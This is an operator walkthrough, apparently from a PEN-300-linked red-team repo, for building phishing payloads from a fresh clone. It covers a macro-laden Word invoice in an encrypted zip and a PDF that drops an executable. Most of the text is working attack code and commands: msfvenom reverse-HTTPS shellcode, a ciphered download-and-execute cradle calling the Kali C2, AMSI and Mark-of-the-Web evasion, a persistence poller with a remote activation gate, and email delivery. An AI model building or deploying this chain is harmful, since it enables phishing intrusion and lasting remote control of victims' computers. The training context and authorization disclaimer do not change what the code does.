# BUILD.md — End-to-End: Clone to Armed Payload

Walks the full pipeline: from a fresh clone of this repo to two fully usable
phishing payloads (`.docm` in an encrypted zip, `.pdf`) with a working C2,
tested against a lab target, and ready for delivery.

Component-level build notes live in each subdirectory's README. This file
is the operator's walkthrough that ties them together.

---

## Hardened lab note

If your target is a PEN-300 challenge lab or any system with AppLocker,
LSA protection, or EDR enabled, read [`HARDENED.md`](HARDENED.md) first.
It lists what the default files catch and what needs to change per vector.

The VBA, poller, and `run.txt` runner in this repo are already written for
hardened labs — emulator detection, non-emulated API checks, split AMSI
strings, and `-EncodedCommand` for the scheduled task. The remaining
question on any specific lab is AppLocker's treatment of the PDF launcher
(see `HARDENED.md` for three escape routes).

---

## Prerequisites

### On the Kali C2 box

```bash
sudo apt install -y apache2 mono-devel p7zip-full pandoc python3
sudo systemctl start apache2
```

Metasploit is assumed installed (Kali default).

### On a Windows dev box

- Windows 10/11 with Microsoft Word (2016 or later)
- .NET Framework 4.x (ships with Windows) — provides `csc.exe`
- Git Bash or WSL if you want to run the bash helpers
- A Windows lab VM for testing — **do not test on a production system**

### Network

Kali must be reachable from the lab VM on TCP 80 (web root) and TCP 443
(Meterpreter handler). In the course lab this is the VPN; on a home lab this
is a bridged adapter.

---

## Step 1 — Set up the C2 web root and handler

### 1a. Web root layout

```bash
sudo mkdir -p /var/www/html
sudo chown -R www-data:www-data /var/www/html
sudo chmod 755 /var/www/html

# Placeholder decoy page (optional)
cat > /var/www/html/decoy.html <<'HTML'
<!doctype html><html><head><title>IT Portal</title></head>
<body><h1>Document Portal</h1>
<p>Please contact IT support for access.</p></body></html>
HTML

# Activate gate — start absent. Touch this to fire the on-demand callback.
# Do NOT create it yet.
```

### 1b. Start the Metasploit handler

```bash
mkdir -p ~/self_cert && cd ~/self_cert
openssl req -new -x509 -nodes -out cert.crt -keyout priv.key \
    -days 365 -subj "/C=US/ST=TX/L=Houston/O=NASA/OU=JSC/CN=nasa.gov"
cat priv.key cert.crt > nasa.pem
cd -

# Edit handler.rc to point at ~/self_cert/nasa.pem and your LHOST
$EDITOR shared/handler.rc

# Launch
msfconsole -q -r shared/handler.rc
```

Verify: `msf6 > jobs` should show the handler running on 443.

---

## Step 2 — Generate `run.txt`

`run.txt` is the ciphered reflective PowerShell shellcode runner that both
vectors download. Template in `shared/run_txt_example.ps1`.

### 2a. Generate raw shellcode

```bash
cd /tmp
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=<KALI_IP> LPORT=443 \
    EXITFUNC=thread -f ps1 -o raw.txt
```

### 2b. Cipher the shellcode (Caesar +5)

```bash
python3 - <<'PY'
import re
data = open('raw.txt').read()
nums = re.findall(r'0x([0-9a-fA-F]{2})', data)
enc  = [ (int(n,16) + 5) & 0xFF for n in nums ]
with open('ciphered.txt','w') as f:
    f.write('[Byte[]] $buf = ' + ','.join(f'0x{b:02x}' for b in enc))
PY
```

### 2c. Assemble run.txt

Copy `shared/run_txt_example.ps1` to `run.txt`, then replace the line:

```powershell
[Byte[]] $buf = <CIPHERED_SHELLCODE_BYTES_HERE>
```

with the contents of `ciphered.txt`.

### 2d. Deploy

```bash
sudo cp run.txt /var/www/html/run.txt
sudo chmod 644 /var/www/html/run.txt
```

**Verify from a lab browser:**
`http://<KALI_IP>/run.txt` should return the script as plaintext.

---

## Step 3 — Build the DOC vector

### 3a. Generate the docx body

```bash
cd doc
pandoc q4_invoice_body.md -o Q4_Invoice.docx
```

### 3b. Encode the poller for embedding

```bash
python3 tools/encode_poller.py shared/activate_poller.ps1
# Copy the single-line base64 output.
```

### 3c. Embed the macro in Word (manual)

1. Open `Q4_Invoice.docx` in Word.
2. `Alt+F11` → Insert → Module.
3. Paste the entire contents of `doc/q4_invoice.vba`.
4. **Edit these placeholders in the VBA before saving:**
   - `Const POLLER_B64 As String = "PASTE_BASE64_BLOB_HERE"` — paste the
     base64 output from step 3b between the quotes.
   - In `MyMacro` and `PersistRunKey` and `PersistStartupLink`, change
     `http://192.168.119.120/run.txt` to your Kali IP.
5. File → Save As → **Word Macro-Enabled Document (\*.docm)** →
   `Q4_Invoice.docm`.
6. Close, reopen. Confirm the yellow **SECURITY WARNING — Macros have been
   disabled** banner appears. Click **Enable Content**. Verify no error.

### 3d. Package for delivery

```bash
7z a -p"invoice2024" -mhe=on -tzip Q4_Invoice.zip Q4_Invoice.docm
```

`Q4_Invoice.zip` is your DOC vector, ready to attach.

---

## Step 4 — Build the PDF vector

### 4a. Encode the cradle and populate payload.cs

```bash
python3 - <<'PY'
import base64
cmd = "iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
b64 = base64.b64encode(cmd.encode('utf-16-le')).decode()
ciphered = [b ^ 0x5A for b in b64.encode('utf-8')]
print("static byte[] ciphered = new byte[] {")
print(",".join(f"0x{b:02x}" for b in ciphered))
print("};")
PY
```

Paste the output over the placeholder in `pdf/payload.cs`.

### 4b. Compile the launcher

```bash
cd pdf

# On Windows:
csc /target:exe /platform:x64 /out:payload.exe payload.cs

# Or on Linux/WSL:
mcs -platform:x64 -out:payload.exe payload.cs
```

### 4c. Generate the PDF

```bash
python3 build_pdf_payload.py \
    --exe payload.exe \
    --out Q4_Invoice.pdf \
    --name "Q4_Invoice_Update.exe"
```

`Q4_Invoice.pdf` is your PDF vector, ready to attach.

---

## Step 5 — Test on the lab VM

**Do this before any real delivery.** Both vectors.

### 5a. Test the DOC vector

1. Copy `Q4_Invoice.zip` to the lab VM.
2. Extract with 7-Zip using password `invoice2024`.
3. Verify the extracted `.docm` **does not** carry MoTW (right-click →
   Properties → Security should be blank).
4. Open the `.docm` in Word → click **Enable Content**.
5. Watch the handler — a Meterpreter session should open within ~10 seconds.

If no session:
- Check the web log: `sudo tail -f /var/log/apache2/access.log` — did the
  VM request `run.txt`?
- Check for a Defender alert on the VM
- Confirm WMI is reachable (`Get-Service Winmgmt`)

### 5b. Test the PDF vector

1. Copy `Q4_Invoice.pdf` to the lab VM.
2. Open in **Adobe Reader**.
3. Confirm the "Loading invoice viewer..." alert appears.
4. Confirm the "Open attachment?" prompt appears with the correct filename.
5. Click **Open**. Handler should catch a session.

If no session:
- Confirm Reader's JavaScript is enabled (Edit → Preferences → JavaScript)
- Check Defender's Protection History for `payload.exe`

### 5c. Test persistence

After a successful shell from either vector:

1. Reboot the VM.
2. Log back in as the same user.
3. Wait 5–10 minutes (the poller runs every 5 minutes).
4. From Kali: `sudo touch /var/www/html/activate`
5. Within 5 minutes, a new session should open without any user action.

Then:

```bash
sudo rm /var/www/html/activate
```

### 5d. Test the callback gate

While the target is running the poller, verify that **no session fires**
when `/activate` is absent. Watch the handler for 10 minutes. You should
see nothing.

---

## Step 6 — Package and deliver

| File | Vector | Delivery |
|------|--------|----------|
| `Q4_Invoice.zip` | DOC | Attach to email — password in body |
| `Q4_Invoice.pdf` | PDF | Attach directly, or zip if gateway strips PDFs |

Sample email body in `doc/q4_invoice_body.md`. Adapt to the engagement's
cover story.

---

## Step 7 — Operator workflow during engagement

```bash
# 1. Handler running (from Step 1b)
# 2. Deliver either vector via phishing
# 3. When user clicks, session opens:
sessions -l
sessions -i <n>
background

# 4. Target under our control. Persistence installed.
# 5. To re-establish later (after logoff, lock, reboot):
sudo touch /var/www/html/activate
# wait up to 5 minutes
# when session opens:
sudo rm /var/www/html/activate

# 6. Before engagement close:
sessions -i <n>
shell
powershell -exec bypass -File shared/cleanup.ps1
exit
```

---

## Troubleshooting

| Symptom | Likely cause | Fix |
|---------|--------------|-----|
| Word blocks macro, no "Enable Content" | Office 2021/365 macro policy | Use PDF vector |
| `.docm` opens in Protected View | MoTW propagated through zip | Re-zip with `7z -mhe=on` |
| PDF opens in browser, no JS | Chrome/Edge/Firefox built-in viewer | Set Adobe Reader as default |
| No session after Enable Content | Cradle failed (WMI, network, DNS) | Check Apache log — did VM hit `/run.txt`? |
| No session from PDF | Defender caught `payload.exe` | Check history; add injection layer (Mod 24.3.1) |
| Handler catches, then dies | Stage encoding or EXITFUNC | Confirm `EXITFUNC=thread` and `EnableStageEncoding true` |
| `/activate` fires but no session | AMSI bypass failed or Defender caught runner | Disable AMSI manually to test; swap bypass method |
| `csc` not found on Windows | PATH missing .NET dir | Add `C:\Windows\Microsoft.NET\Framework64\v4.0.30319` to PATH |
| Scheduled task never fires | `schtasks /tr` length exceeded | Already avoided — the VBA uses `Register-ScheduledTask` |

---

## What NOT to do

- Do not test against any system you do not own or do not have written
  authorization to test.
- Do not push compiled artifacts to a public repo. `.gitignore` blocks them.
- Do not reuse the certificate, cradle base64, or cipher key across
  engagements.
- Do not leave `/activate` present on the C2 after an engagement. Remove it.

---

## Course cross-reference

| Step | PEN-300 Module |
|------|----------------|
| AMSI bypass in poller / runner | Mod 12.3.1 |
| DOC vector macro | Mod 4.1.2 |
| De-chaining via WMI | Mod 11.8.2 |
| Emulator detection | Mod 11.6.1 |
| Non-emulated API check | Mod 11.6.2 |
| Ciphered shellcode | Mod 11.5.2 |
| Reflective shellcode runner | Mod 8.2.3 |
| PDF embedding + OpenAction | Mod 4-adjacent |
| Certificate signing | Mod 14.3.1 |
| Stage encoding | Mod 11.4.1 |
